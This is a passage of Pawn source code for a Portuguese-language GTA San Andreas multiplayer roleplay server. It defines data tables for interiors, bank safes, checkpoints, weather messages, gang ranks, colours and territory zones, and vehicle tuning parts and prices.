	{INT_HORSE_LOTTERY,     	1288.7091,    	271.2033,    	19.5546,		2},
	{INT_DISCO,     			1836.9982,		-1682.4395,		13.3245},
	{INT_STRIP_CLUB,     		2421.4727,		-1219.2466,		25.5617},
	{INT_RESTAURANT,     		1578.5620,    	-1781.2532,    	13.2820,		1},
	{INT_RESTAURANT,     		875.5147,    	-968.6926,    	37.1875,		2},
	{INT_RESTAURANT,     		2865.4667,    	-1465.8026,    	10.9527,		3},
	{INT_RESTAURANT,     		1999.4932,    	-1285.6721,    	28.4880,		4},
	{INT_RESTAURANT,     		2354.4052,    	-1511.3803,    	24.0000,		5},
	{INT_RESTAURANT,     		1949.0118,    	-1985.1995,    	13.5468,		6},
	{INT_RESTAURANT,     		681.6321,    	-473.3847,    	16.5362,		7},
	{INT_RESTAURANT,     		1294.7957,    	235.4372,    	19.5546,		8},
	{INT_RESTAURANT,            -2103.7668,    	-2342.0266,    	30.6172,        9},
	{INT_BAR,     				2309.9421,		-1643.3970,		14.8270,		1},
	{INT_BAR,     				2348.5839,    	-1372.6842,    	24.3984,		2},
	{INT_BAR,     				2481.9128,    	-1757.9896,    	13.5468,		3},
	{INT_BAR,     				2129.9448,    	-1761.9606,    	13.5625,		4},
	{INT_BAR,     				2152.0769,    	-1015.0353,    	62.7755,		5},
	{INT_BAR,     				1945.0014,    	-2043.0375,    	14.0558,		6},
	{INT_BAR,     				2067.7434,    	-1897.2136,    	13.5538,		7},
	{INT_BAR,     				1848.3049,    	-1871.7236,    	13.5781,		8},
	{INT_BAR,     				2460.6677,    	-1343.8344,    	24.0000,		9},
	{INT_BAR,     				172.2658,     	-152.5574,     	1.5745,			10},
	{INT_BAR,     				1310.8590,    	329.9731,    	19.9140,		11},
	{INT_BINCO,     			2244.3374,		-1665.5439,		15.4766},
	{INT_SUB_URBAN,     		2112.9064,    	-1211.4880,    	23.9629},
	{INT_PRO_LAPS,              499.6039,    	-1360.6517,    	16.3683},
	{INT_VICTIM,                461.6965,    	-1500.8066,    	31.0454},
	{INT_DIDIER_SACHS,          454.1304,    	-1477.8112,    	30.8084},
	{INT_GUN_SHOP,     			1368.7594,		-1279.9406,		13.5469,		1},
	{INT_GUN_SHOP,     			2400.3770,		-1981.9899,		13.5469,		2},
	{INT_GUN_SHOP,     			243.2903,    	-178.2829,    	1.5821,			3},
	{INT_GUN_SHOP,     			2333.2983,    	61.7966,    	26.7057,		4},
	{INT_GUN_SHOP,              -2093.6718,    	-2464.9125,    	30.6250,        5},
	{INT_DONUTS_SHOP,    		1038.0264,		-1340.7273,		13.7450,		1},
	{INT_DONUTS_SHOP,           -2767.7292,    	788.5875,    	52.7812,        2},
	{INT_CLUCKIN_BELL,    		928.9063,    	-1352.7833,    	13.3437,		1},
	{INT_CLUCKIN_BELL,    		2419.7690,    	-1509.0211,    	24.0000,		2},
	{INT_CLUCKIN_BELL,    		2397.7150,    	-1899.1584,    	13.5468,		3},
	{INT_CLUCKIN_BELL,          -2155.3918,    	-2460.2736,    	30.8515,        4},
	{INT_CLUCKIN_BELL,    		-1213.5300,    	1830.4519,    	41.9296,		5},
	{INT_PIZZERIA,    			2105.1533,    	-1806.5140,    	13.5546,		1},
	{INT_PIZZERIA,    			203.4045,    	-201.9604,    	1.5781,			2},
	{INT_PIZZERIA,    			2332.0832,    	75.0036,    	26.6209,		3},
	{INT_PIZZERIA,    			1367.4565,    	248.4062,    	19.5669,		4},
	{INT_BURGER_SHOT,    		810.4860,    	-1616.1186,    	13.5468,		1},
	{INT_BURGER_SHOT,    		1199.3444,    	-918.3958,    	43.1207,		2},
	{INT_POLICE_DEPARTMENT,    	1555.3104,		-1675.4611,		16.1953},
	{INT_QUESTIONING,           246.3487,    	88.0000,    	1003.6406,      0,	6,	(-1)},
	{INT_TRIBUNAL,    			1481.1106,		-1770.5613,		18.7958},
	{INT_INSURER,               288.0831,    	-1601.6064,    	32.7656,		1},
	{INT_INSURER,               2861.7141,    	-1405.8703,    	11.7343,		2},
	{INT_REAL_ESTATE,           1381.3723,    	-1088.7031,    	27.4076,		3},
	{INT_TOY_SHOP,              509.6366,    	-1394.4437,    	16.1328},
	{INT_WORLD_COQ,             462.2781,    	-1529.2319,    	29.9590,		1},
	{INT_WORLD_COQ,             388.0303,    	-1897.1345,    	7.8359,         2},
	{INT_WORLD_COQ,             2228.4189,    	-1150.7246,    	1025.7968,      3,	15,	(2)},
	{INT_SEX_SHOP,              1940.0137,    	-2116.0236,    	13.6953},
	{INT_FARM,                  -1060.9671,    	-1195.6568,    	129.6929},
	{INT_HOTEL,                 487.3250,    	-1639.1093,    	23.7031},
	{INT_FUNK,                  2259.9189,    	-1019.6525,    	59.2927,        1},
	{INT_ACCESS1,            	2193.4538,    	-1147.6584,    	1033.7968,      0,	15,	(-1)},
	{INT_ACCESS2,              	1461.5140,    	-1881.8421,    	13.5468},
	{INT_ACCESS3,               1022.1782,    	-983.7165,    	42.6600},
	{INT_ACCESS4,               1570.5909,    	-1337.2789,    	16.4843},
	{INT_ACCESS5,               1804.3277,    	-2335.4887,    	-2.6536}
};

new Enter[MAX_SLOTS] = 0;
new Door[MAX_SLOTS] = 0;

//Cofres
enum safeInfo
{
	sName[64],
	sRef[64],
	sEnter,
	sLimit,
	sMoney
}

enum safepointInfo
{
	safepointInt,
	Float:safepointX,
	Float:safepointY,
	Float:safepointZ,
	Float:safepointA
}

new Safes[][safeInfo] = {
	{NULL},
	{"Banco",       "Little Mexico",		0,		2000},
	{"Banco",       "Market",				1,		2000},
	{"Banco",       "Rodeo",				3,		2000},
	{"Banco",       "Dillimore",			4,		500},
	{"Banco",       "Palomino Creek",		6,		500}
};

new SafePoints[][safepointInfo] = {
	{INT_BANK,		2315.1120,		-16.5328,		26.7495,	174.5975}
};

//Checkpoints
enum cpInfo
{
	cpId,
	Float:cpX,
	Float:cpY,
	Float:cpZ,
	Float:cpSize,
	Float:cpRadi,
	cpInt,
	cpVirtualWorld
}

new Checkpoints[][cpInfo] = {
	{CHECKPOINT_AMMUNATION,		307.9372,	-141.4641,	999.6016,	2.0,	20.0,	7},
	{CHECKPOINT_DONUTS,         379.2017,	-184.1104,	1000.6328,  2.0,    10.0,   17},
	{CHECKPOINT_PIZZA,        	373.6723,   -118.8036,  1001.4921,  2.0,    10.0,   5},
	{CHECKPOINT_CHICKEN,        369.4777,   -6.0215,    1001.8515,  2.0,    10.0,   9},
	{CHECKPOINT_BURGER,         376.7625,   -67.4363,   1001.5078,  2.0,    10.0,   10},
	{CHECKPOINT_DRINKS,         499.9699,   -20.6398,   1000.6796,  2.0,    10.0,   17},
	{CHECKPOINT_DRINKS,     	1215.8127,  -13.3527,   1000.9218,  2.0,    10.0,   2},
	{CHECKPOINT_DRINKS,         -224.9938,  1404.3552,  27.7734,  	2.0,    10.0,   18},
	{CHECKPOINT_DRINKS,         251.4430,   -56.2977,   1.5703,     2.0,    10.0,   0},
	{CHECKPOINT_RESTAURANT,     679.0607,   -456.7506,  -25.6098,   2.0,    10.0,   1},
	{CHECKPOINT_RESTAURANT,     2328.4916,  6.7842,    	26.5273,    2.0,    10.0,   0},
	{CHECKPOINT_24/7_SHOP,      -22.1761,   -138.6281,  1003.5468,  2.0,    10.0,   16},
	{CHECKPOINT_TOY_SHOP,       -2236.8002, 130.1802,   1035.4140,  2.0,    12.0,   6},
	{CHECKPOINT_WORLD_COQ,      446.1776,   -8.4340,    1000.7343,  3.0,    15.0,   1},
	{CHECKPOINT_SEX_SHOP,       -103.8628,  -22.6560,   1000.7187,  2.0,    12.0,   3},
	{CHECKPOINT_HOTEL,			2217.3352,  -1146.4112, 1025.7968,  2.0,    10.0,   15},
	{CHECKPOINT_LOTTERY,        -2161.3852, 640.3587,   1052.3817,  3.0,    20.0,   1},
	{CHECKPOINT_BINCO,			206.3577,   -100.5160,  1005.2578,  3.0,    15.0,   15},
	{CHECKPOINT_SUB_URBAN,		201.0391,   -40.2275,   1001.8046,  3.0,    15.0,   1},
	{CHECKPOINT_PRO_LAPS,		207.0775,   -129.5187,  1003.5078,  3.0,    15.0,   3},
	{CHECKPOINT_VICTIM,			206.7637,   -7.2641,    1001.2109,  3.0,    15.0,   5},
	{CHECKPOINT_DIDIER_SACHS,	204.5039,   -159.3861,  1000.5234,  3.0,    15.0,   14}
};

new Checkpoint[MAX_SLOTS];
new CheckpointStatus[MAX_SLOTS];

//Dias
new Days[][64] = {
    "Domingo",
	"Segunda-Feira",
	"Terca-Feira",
	"Quarta-Feira",
	"Quinta-Feira",
	"Sexta-Feira",
	"Sabado"
};

//Climas
enum weatherInfo
{
	wWeatherId,
	wInfo[64],
	wDescription[128]
}

new Weathers[][weatherInfo] = {
	{0,     	"Ensolarado, acima de 30°C",        "Calor, dia bom para ir a praia, tomar um sorvete, sabe como é né? ^^"},
	{1,         "Ensolarado, 30ºC",                 "Prepare-se, o calor está por vir, tempo bom para atividades ao ar livre."},
	{2,         "Ensolarado com smog, 35ºC",        "Dia quente, saiá de casa, aprecie o mundo ao ar livre. =D"},
	{4,         "Nublado, 25ºC",                    "Dia quente e nublado, não fique em casa, vá para o bar e tome uma bem gelada. ^^"},
	{9,			"Neblina, abaixo de 18°C",			"Se prepare, pois o frio está por vir, fique em casa, em sua cama, e não saiá de lá..."},
	{11,    	"Ensolarado, acima de 32°C",        "Dia muito quente, bom para atividades ao ar livre, como pescar."},
	{12,        "Nublado, 30ºC",                    "Céu nublado, temperatura alta, é isto que iremos presenciar..."},
	{14,        "Ensolarado, 28ºC",                 "Sol, calor, e ai? Já decidiu o que vai fazer?"},
	{15,        "Nublado, 24ºC",                    "Clima estabilizado com o céu nublado, não parece muito interessante! =/"},
	{16,        "Chuvoso, 22ºC",                    "Olha a chuva ai! Se for sair, não esqueça o guarda-chuva..."},
	{17,    	"Ensolarado, cerca de 35°C",        "Dia muito quente, ótimo para beber um refrigerante e ir a praia."}
};

//Gangues
new GangPosts[][64] = {
	NULL,
	"Soldado",
	"Piloto",
	"Olheiro",
	"Fogueteiro",
	"Traficante",
	"Torre",
	"Braco Direito",
	"Lider"
};
	
enum gangcolourInfo
{
	gColourName[64],
	gColourFormat[16],
	gColourHex
}

new GangColours[][gangcolourInfo] = {
	{"Branco", 				"~w~",			0xFFFFFF55},
	{"Preto",   			"~l~",			0x00000055},
	{"Vermelho",   			"~r~",			0xFF000055},
	{"Vermelho-Escuro",     "~r~",			0x8B000055},
	{"Verde",   			"~g~",			0x00FF0055},
	{"Verde-Claro",         "~h~~g~",		0x90EE9055},
	{"Verde-Escuro",        "~g~",			0x00640055},
	{"Azul",        		"~b~",			0x0000FF55},
	{"Azul-Claro",      	"~h~~b~",		0xADD8E655},
	{"Azul-Escuro",     	"~b~",			0x4169E155},
	{"Azul-Ceu",          	"~h~~b~",		0x87CEFA55},
	{"Navy",                "~b~",			0x00008055},
	{"Aqua",                "~h~~g~",		0x7FFFD455},
	{"Ciano",               "~h~~b~",		0x00FFFF55},
	{"Magenta",             "~l~",			0xFF00FF55},
	{"Amarelo",     		"~y~",			0xFFFF0055},
	{"Cinza",       		"~l~",			0xB5B5B555},
	{"Laranja",     		"~y~",			0xFF450055},
	{"Rosa",        		"~l~",			0xFFC0CB55},
	{"Dourado",     		"~y~",			0xFFD70055},
	{"Roxo",            	"~p~",			0xA020F055},
	{"Marrom",              "~l~",			0x8B451355}
};

enum gangzoneInfo
{
	gzName[27],
	Float:gzMinX,
	Float:gzMinY,
	Float:gzMaxX,
	Float:gzMaxY,
	gzId,
	gzAttacker,
	gzScore,
	gzTimer
}

new GangZones[][gangzoneInfo] = {
	{"Commerce",					1323.90,	-1842.20,   1701.90, 	-1722.20},
	{"Commerce",                    1323.90, 	-1722.20,   1440.90, 	-1577.50},
	{"Commerce",                    1370.80, 	-1577.50,   1463.90, 	-1384.90},
	{"Commerce",                    1463.90, 	-1577.50,   1667.90, 	-1430.80},
	{"Commerce",                    1583.50, 	-1722.20,   1758.90, 	-1577.50},
	{"Commerce",                    1667.90, 	-1577.50,   1812.60, 	-1430.80},
	{"East Beach",                  2632.80, 	-1852.80,   2959.30, 	-1668.10},
	{"East Beach",                  2632.80, 	-1668.10,   2747.70, 	-1393.40},
	{"East Beach",                  2747.70, 	-1668.10,   2959.30, 	-1498.60},
	{"East Beach",                  2747.70, 	-1498.60,   2959.30, 	-1120.00},
	{"East Los Santos",             2421.00, 	-1628.50,   2632.80, 	-1454.30},
	{"East Los Santos",             2222.50, 	-1628.50,   2421.00, 	-1494.00},
	{"East Los Santos",             2266.20, 	-1494.00,   2381.60, 	-1372.00},
	{"East Los Santos",             2381.60, 	-1494.00,   2421.00, 	-1454.30},
	{"East Los Santos",             2281.40, 	-1372.00,   2381.60, 	-1135.00},
	{"East Los Santos",             2381.60, 	-1454.30,   2462.10, 	-1135.00},
	{"East Los Santos",             2462.10, 	-1454.30,   2581.70, 	-1135.00},
	{"Ganton",                      2222.50, 	-1852.80,   2632.80, 	-1722.30},
	{"Ganton",                      2222.50, 	-1722.30,   2632.80, 	-1628.50},
	{"Glen Park",                   1812.60, 	-1449.60,   1996.90, 	-1350.70},
	{"Glen Park",                   1812.60, 	-1100.80,   1994.30,  	-973.30},
	{"Glen Park",                   1812.60, 	-1350.70,   2056.80, 	-1100.80},
	{"Idlewood",                    1812.60, 	-1852.80,   1971.60, 	-1742.30},
	{"Idlewood",                    1812.60, 	-1742.30,   1951.60, 	-1602.30},
	{"Idlewood",                    1951.60, 	-1742.30,   2124.60, 	-1602.30},
	{"Idlewood",                    1812.60, 	-1602.30,   2124.60, 	-1449.60},
	{"Idlewood",                    2124.60, 	-1742.30,   2222.50, 	-1494.00},
	{"Idlewood",                    1971.60, 	-1852.80,   2222.50, 	-1742.30},
	{"Jefferson",                   2124.60, 	-1494.00,   2266.20, 	-1449.60},
	{"Jefferson",                   2056.80, 	-1372.00,   2281.40, 	-1210.70},
	{"Jefferson",                   2056.80, 	-1210.70,   2185.30, 	-1126.30},
	{"Jefferson",                   2185.30, 	-1210.70,   2281.40, 	-1154.50},
	{"Jefferson",                   2056.80, 	-1449.60,   2266.20, 	-1372.00},
	{"Las Colinas",                 1994.30, 	-1100.80,   2056.80, 	-920.80},
	{"Las Colinas",                 2056.80, 	-1126.30,   2126.80,  	-920.80},
	{"Las Colinas",                 2185.30, 	-1154.50,   2281.40,  	-934.40},
	{"Las Colinas",                 2126.80, 	-1126.30,   2185.30,  	-934.40},
	{"Las Colinas",                 2747.70, 	-1120.00,   2959.30,  	-945.00},
	{"Las Colinas",                 2632.70, 	-1135.00,   2747.70,  	-945.00},
	{"Las Colinas",                 2281.40, 	-1135.00,   2632.70,  	-945.00},
	{"Little Mexico",               1701.90, 	-1842.20,   1812.60, 	-1722.20},
	{"Little Mexico",               1758.90, 	-1722.20,   1812.60, 	-1577.50},
	{"Los Flores",                  2581.70, 	-1454.30,   2632.80, 	-1393.40},
	{"Los Flores",                  2581.70, 	-1393.40,   2747.70, 	-1135.00},
	{"Playa del Seville",           2703.50, 	-2126.90,   2959.30, 	-1852.80},
	{"Unity Station",               1692.60, 	-1971.80,   1812.60, 	-1932.80},
	{"Verdant Bluffs",              930.20, 	-2488.40,   1249.60, 	-2006.70},
	{"Verdant Bluffs",              1073.20, 	-2006.70,   1249.60, 	-1842.20},
	{"Verdant Bluffs",              1249.60, 	-2179.20,   1692.60, 	-1842.20},
	{"Willowfield",                 1970.60, 	-2179.20,   2089.00, 	-1852.80},
	{"Willowfield",                 2089.00, 	-2235.80,   2201.80, 	-1989.90},
	{"Willowfield",                 2089.00, 	-1989.90,   2324.00, 	-1852.80},
	{"Willowfield",                 2201.80, 	-2095.00,   2324.00, 	-1989.90},
	{"Willowfield",                 2541.70, 	-1941.40,   2703.50, 	-1852.80},
	{"Willowfield",                 2324.00, 	-2059.20,   2541.70, 	-1852.80},
	{"Willowfield",                 2541.70, 	-2059.20,	2703.50, 	-1941.40}
};

new GangAttackTimer[MAX_SLOTS];
new GangAttack[MAX_SLOTS] = 0;
new Zone[MAX_SLOTS] = 0;

//Seta
new ArrowObject[MAX_SLOTS] = {-1, ...};
new Float:ArrowPointTo[MAX_SLOTS][3];

//Tuning
new Menu:mTuning;
new Tunes[20];
new TuneData[5] = {INVALID_PLAYER_ID, -1, ...};

enum TuneInfo
{
	tuneName[64],
	tuneValue,
	tuneSlot
}

new SimilarComponents[][2] = {
	{1007, 1017},
	{1026, 1027},
	{1030, 1031},
	{1036, 1040},
	{1039, 1041},
	{1042, 1099},
	{1047, 1051},
	{1048, 1052},
	{1056, 1062},
	{1057, 1063},
	{1069, 1071},
	{1070, 1072},
	{1090, 1094},
	{1093, 1095},
	{1106, 1124},
	{1107, 1108},
	{1118, 1120},
	{1119, 1121},
	{1122, 1101},
	{1133, 1102},
	{1143, 1142},
	{1145, 1144}
};

new Components[][TuneInfo] = {
	{"Pro", 								1000, 				SPOILERS},
	{"Win", 								900, 				SPOILERS},
	{"Drag", 								900, 				SPOILERS},
	{"Alpha", 								700, 				SPOILERS},
	{"Champ Scoop", 						700, 				HOODS},
	{"Fury Scoop", 							900, 				HOODS},
	{"Roof Scoop", 							400, 				ROOFSCOOPS},
	{"Sideskirt", 							800, 				SIDESKIRTS},
	{"Nitro 2x", 							1000, 				NITROS},
	{"Nitro 5x", 							2000, 				NITROS},
	{"Nitro 10x", 							3000, 				NITROS},
	{"Race Scoop", 							1600, 				HOODS},
	{"Worx Scoop", 							1500, 				HOODS},
	{"Round Fog", 							800, 				LAMPS},
	{"Champ", 								1900, 				SPOILERS},
	{"Race", 								1700, 				SPOILERS},
	{"Worx", 								1500, 				SPOILERS},
	{"Sideskirt", 							800, 				SIDESKIRTS},
	{"Upswept", 							1200, 				EXHAUSTS},
	{"Twin", 								1000, 				EXHAUSTS},
	{"Large", 								800, 				EXHAUSTS},
	{"Medium", 								600, 				EXHAUSTS},
	{"Small", 								400, 				EXHAUSTS},
	{"Fury", 								800, 				SPOILERS},
	{"Square Fog", 							1000, 				LAMPS},
	{"Off Road", 							1200, 				WHEELS},
	{"Alien", 								1400, 				SIDESKIRTS},
	{"Alien", 								1400, 				SIDESKIRTS},
	{"Alien", 								2000, 				EXHAUSTS},
	{"X-Flow", 								1500, 				EXHAUSTS},
	{"X-Flow", 								1200, 				SIDESKIRTS},
	{"X-Flow", 								1200, 				SIDESKIRTS},
	{"Alien Roof", 							1200, 				ROOFSCOOPS},
	{"X-Flow Roof", 						1000, 				ROOFSCOOPS},
	{"Alien", 								2000, 				EXHAUSTS},
	{"X-Flow Roof", 						1000, 				ROOFSCOOPS},
	{"Alien", 								1400, 				SIDESKIRTS},
	{"X-Flow", 								1500, 				EXHAUSTS},
	{"Alien Roof", 							1200, 				ROOFSCOOPS},
	{"X-Flow", 								1200, 				SIDESKIRTS},
	{"Alien", 								1400, 				SIDESKIRTS},
	{"X-Flow", 								1200, 				SIDESKIRTS},
	{"Chrome", 								1200, 				SIDESKIRTS},
	{"Slamin", 								1800, 				EXHAUSTS},
	{"Chrome", 								2000, 				EXHAUSTS},
	{"X-Flow", 								1500, 				EXHAUSTS},
	{"Alien", 								2000, 				EXHAUSTS},
	{"Alien", 								1400, 				SIDESKIRTS},
	{"X-Flow", 								1200, 				SIDESKIRTS},
	{"Alien", 								1800, 				SPOILERS},
	{"X-Flow", 								1200, 				SPOILERS},
	{"Alien", 								1400, 				SIDESKIRTS},
	{"X-Flow", 								1200, 				SIDESKIRTS},
	{"X-Flow", 								1000, 				ROOFSCOOPS},
	{"Alien", 								1200, 				ROOFSCOOPS},
	{"Alien", 								1200, 				ROOFSCOOPS},
	{"Alien", 								1400, 				SIDESKIRTS},
	{"X-Flow", 								1200, 				SIDESKIRTS},
	{"Alien", 								1800, 				SPOILERS},
	{"X-Flow", 								1500, 				EXHAUSTS},
	{"X-Flow", 								1200, 				SPOILERS},
	{"X-Flow", 								1000, 				ROOFSCOOPS},
	{"Alien", 								1400, 				SIDESKIRTS},
	{"X-Flow", 								1200, 				SIDESKIRTS},
	{"Alien", 								2000, 				EXHAUSTS},
	{"Alien", 								2000, 				EXHAUSTS},
	{"X-Flow", 								1500, 				EXHAUSTS},
	{"Alien", 								1200, 				ROOFSCOOPS},
	{"X-Flow", 								1000, 				ROOFSCOOPS},
	{"Alien", 								1400, 				SIDESKIRTS},
	{"X-Flow", 								1200, 				SIDESKIRTS},
	{"Alien", 								1400, 				SIDESKIRTS},
	{"X-Flow", 								1200, 				SIDESKIRTS},
	{"Shadow", 								1000, 				WHEELS},
	{"Mega", 								1200, 				WHEELS},
	{"Rimshine", 							2000, 				WHEELS},
	{"Wires", 								1700,	 			WHEELS},
	{"Classic", 							1700, 				WHEELS},
	{"Twist", 								2100, 				WHEELS},
	{"Cutter", 								1400, 				WHEELS},
	{"Switch", 								2300, 				WHEELS},
	{"Grove", 								1500, 				WHEELS},
	{"Import", 								1500, 				WHEELS},
	{"Dollar", 								2000, 				WHEELS},
	{"Trancer", 							1600, 				WHEELS},
	{"Atomic", 								1800, 				WHEELS},
	{"Estereo", 							500, 				STEREO},
	{"Hidraulica", 							2000, 				HYDRAULICS},
	{"Alien", 								1200, 				ROOFSCOOPS},
	{"X-Flow", 								1500, 				EXHAUSTS},
	{"Alien", 								1400, 				SIDESKIRTS},
	{"X-Flow",	 							1000, 				ROOFSCOOPS},
	{"Alien", 								2000,		 		EXHAUSTS},
	{"X-Flow", 								1200, 				SIDESKIRTS},
	{"Alien", 								1400, 				SIDESKIRTS},
	{"X-Flow", 								1200,	 			SIDESKIRTS},
	{"Ahab", 								2000, 				WHEELS},
	{"Virtual",								1200, 				WHEELS},
	{"Access", 								1400, 				WHEELS},
	{"Chrome", 								1200, 				SIDESKIRTS},
	{"Chrome Grill", 						1500, 				BULLBARS},
	{"Chrome Flames", 						2000, 				SIDESKIRTS},
	{"Chrome Strip", 						1700, 				SIDESKIRTS},
	{"Convertible", 						1500, 				ROOFSCOOPS},
	{"Chrome", 								2000, 				EXHAUSTS},
	{"Slamin", 								1800, 				EXHAUSTS},
	{"Chrome Arches", 						2000, 				SIDESKIRTS},
	{"Chrome Strip", 						1600, 				SIDESKIRTS},
	{"Chrome Strip", 						1600, 				SIDESKIRTS},
	{"Chrome", 								2500, 				REARBULLBARS},
	{"Slamin", 								2000, 				REARBULLBARS},
	{"Little Sign 1",					 	1200, 				FRONTSIGN},
	{"Little Sign 2", 						1500, 				FRONTSIGN},
	{"Chrome", 								2000, 				EXHAUSTS},
	{"Slamin", 								1800, 				EXHAUSTS},
	{"Chrome", 								2500, 				FRONTBULLBARS},
	{"Slamin", 								2000, 				FRONTBULLBARS},
	{"Chrome", 								2200, 				FRONTBUMPERS},
	{"Chrome Trim", 						1000, 				SIDESKIRTS},
	{"Wheelcovers", 						1200, 				SIDESKIRTS},
	{"Chrome Trim", 						1000, 				SIDESKIRTS},
 	{"Wheelcovers", 						1200, 				SIDESKIRTS},
 	{"Chrome Flames", 						2000, 				SIDESKIRTS},
 	{"Bullbar Chrome Bars", 				1600,			 	BULLBARS},
 	{"Chrome Arches", 						1800, 				SIDESKIRTS},
	{"Bullbar Chrome Lights", 				1300, 				BULLBARS},
	{"Chrome", 								2000, 				EXHAUSTS},
	{"Slamin", 								1800, 				EXHAUSTS},
	{"Vinyl Hardtop", 						3750, 				ROOFSCOOPS},
	{"Chrome", 								2000, 				EXHAUSTS},
	{"Hardtop", 							3500, 				ROOFSCOOPS},
	{"Softtop", 							4000, 				ROOFSCOOPS},
	{"Slamin", 								1800, 				EXHAUSTS},
	{"Chrome Strip", 						1600, 				SIDESKIRTS},
 	{"Chrome Strip", 						1600, 				SIDESKIRTS},
	{"Slamin", 								1800, 				EXHAUSTS},
	{"Chrome", 								2000, 				EXHAUSTS},
	{"Chrome Strip", 						1700, 				SIDESKIRTS},
	{"Alien", 								1800, 				SPOILERS},
	{"X-Flow", 								1200,		 		SPOILERS},
	{"X-Flow", 								2000, 				REARBUMPERS},
	{"Alien", 								2500, 				REARBUMPERS},
	{"Oval", 								1500, 				VENTS},
	{"Oval", 								1500, 				VENTS},
	{"Square", 								1000, 				VENTS},
	{"Square", 								1000, 				VENTS},
	{"X-Flow", 								1200, 				SPOILERS},
	{"Alien", 								1800, 				SPOILERS},
	{"X-Flow", 								2000, 				REARBUMPERS},
	{"Alien", 								2500, 				REARBUMPERS},
	{"Alien", 								2500, 				REARBUMPERS},
	{"X-Flow",	 							2000, 				REARBUMPERS},
	{"X-Flow", 								2000, 				FRONTBUMPERS},
	{"Alien", 								2500, 				FRONTBUMPERS},
	{"Alien", 								2500, 				REARBUMPERS},
	{"Alien", 								2500, 				FRONTBUMPERS},
	{"X-Flow",	 							2000, 				REARBUMPERS},
	{"X-Flow", 								2000, 				FRONTBUMPERS},
	{"X-Flow", 								1200, 				SPOILERS},
	{"Alien", 								2500, 				REARBUMPERS},
	{"Alien", 								2500, 				FRONTBUMPERS},
	{"X-Flow", 								2000, 				REARBUMPERS},
	{"Alien", 								1800, 				SPOILERS},
	{"X-Flow", 								1200, 				SPOILERS},
	{"Alien", 								1800, 				SPOILERS},
	{"X-Flow", 								2000, 				FRONTBUMPERS},
	{"Alien", 								2500, 				FRONTBUMPERS},
	{"X-Flow", 								2000, 				REARBUMPERS},
	{"Alien", 								2500, 				REARBUMPERS},
	{"Alien", 								2500, 				FRONTBUMPERS},
	{"X-Flow", 								2000, 				FRONTBUMPERS},
	{"Alien", 								2500, 				FRONTBUMPERS},
	{"X-Flow", 								2000, 				FRONTBUMPERS},
	{"X-Flow", 								2000, 				FRONTBUMPERS},
	{"Chrome", 								2500, 				FRONTBUMPERS},
	{"Slamin", 								2000, 				REARBUMPERS},
	{"Chrome", 								2500, 				FRONTBUMPERS},
	{"Slamin", 								2000, 				REARBUMPERS},
	{"Slamin", 								2000, 				REARBUMPERS},
	{"Chrome", 								2500, 				FRONTBUMPERS},
	{"Chrome", 								2500, 				REARBUMPERS},
	{"Slamin", 								2000, 				FRONTBUMPERS},
	{"Chrome", 								2500, 				FRONTBUMPERS},
	{"Slamin", 								2000, 				REARBUMPERS},
	{"Chrome", 								2500, 				REARBUMPERS},
	{"Slamin", 								2000, 				FRONTBUMPERS},
	{"Slamin", 								2000, 				REARBUMPERS},
	{"Chrome", 								2500, 				REARBUMPERS},
	{"Slamin", 								2000, 				FRONTBUMPERS},
	{"Chrome", 								2500, 				FRONTBUMPERS},
	{"Slamin", 								2000,	 			FRONTBUMPERS},
	{"Chrome", 								2500, 				FRONTBUMPERS},
	{"Chrome", 								2500, 				REARBUMPERS},
	{"Slamin", 								2000, 				REARBUMPERS}
};

new CarMods[][15] = {
	{400, 1018, 1019, 1020, 1021, 1013, 1024, 0,    0,    0,    0,    0,    0,    0,    0},     //Landstalker
	{401, 1001, 1003, 1004, 1005, 1006, 1013, 1019, 1020, 1007, 1017, 1142, 1143, 1144, 1145},  //Bravura
	{404, 1019, 1020, 1021, 1013, 1007, 1017, 1000, 1002, 1016, 0,    0,    0,    0,    0},     //Perenial
	{405, 1018, 1019, 1020, 1021, 1000, 1001, 1014, 1023, 0,    0,    0,    0,    0,    0},     //Sentinel
	{410, 1019, 1020, 1021, 1013, 1024, 1001, 1003, 1023, 1007, 1017, 0,    0,    0,    0},     //Manana
	{415, 1018, 1019, 1001, 1003, 1023, 1007, 1017, 0,    0,    0,    0,    0,    0,    0},     //Cheetah
	{418, 1020, 1021, 1006, 1002, 1016, 0,    0,    0,    0,    0,    0,    0,    0,    0},     //Moonbeam
	{420, 1004, 1005, 1019, 1021, 1001, 1003, 0,    0,    0,    0,    0,    0,    0,    0},     //Taxi
	{421, 1018, 1019, 1020, 1021, 1000, 1014, 1016, 1023, 0,    0,    0,    0,    0,    0},     //Washington
	{422, 1013, 1019, 1020, 1021, 1007, 1017, 0,    0,    0,    0,    0,    0,    0,    0},    	//Bobcat
	{426, 1004, 1005, 1019, 1021, 1001, 1003, 1006, 0,    0,    0,    0,    0,    0,    0},     //Premier
	{436, 1019, 1020, 1021, 1022, 1006, 1013, 1001, 1003, 1007, 1017, 0,    0,    0,    0},     //Previon
	{439, 1142, 1143, 1144, 1145, 1013, 1001, 1003, 1023, 1007, 1017, 0,    0,    0,    0},     //Stallion
	{477, 1018, 1019, 1020, 1021, 1006, 1007, 1017, 0,    0,    0,    0,    0,    0,    0},     //ZR-350
	{478, 1004, 1005, 1012, 1020, 1021, 1022, 1013, 1024, 0,    0,    0,    0,    0,    0},     //Walton
	{489, 1004, 1005, 1018, 1019, 1020, 1013, 1024, 1006, 1000, 1002, 1016, 0,    0,    0},     //Rancher
	{491, 1142, 1143, 1144, 1145, 1018, 1019, 1020, 1021, 1003, 1014, 1023, 1007, 1017, 0},     //Virgo
	{492, 1004, 1005, 1000, 1006, 1016, 0,    0,    0,    0,    0,    0,    0,    0,    0},     //Greenwood
	{496, 1001, 1002, 1003, 1006, 1011, 1019, 1020, 1023, 1007, 1017, 1142, 1143, 0,    0},    	//Blista Compact
	{500, 1019, 1020, 1021, 1013, 1024, 0,    0,    0,    0,    0,    0,    0,    0,    0},     //Mesa
	{516, 1004, 1018, 1019, 1020, 1021, 1000, 1002, 1015, 1016, 1007, 1017, 0,    0,    0},     //Nebula
	{517, 1007, 1017, 1142, 1143, 1144, 1145, 1018, 1019, 1020, 1002, 1003, 1016, 1023, 0},     //Majestic
	{518, 1001, 1005, 1006, 1013, 1018, 1020, 1023, 1142, 1143, 1144, 1145, 0,    0,    0},     //Buccaneer
	{527, 1018, 1020, 1021, 1001, 1014, 1015, 1007, 1017, 0,    0,    0,    0,    0,    0},     //Cadrona
	{529, 1011, 1012, 1018, 1019, 1020, 1006, 1001, 1003, 1023, 1007, 1017, 0,    0,    0},     //Willard
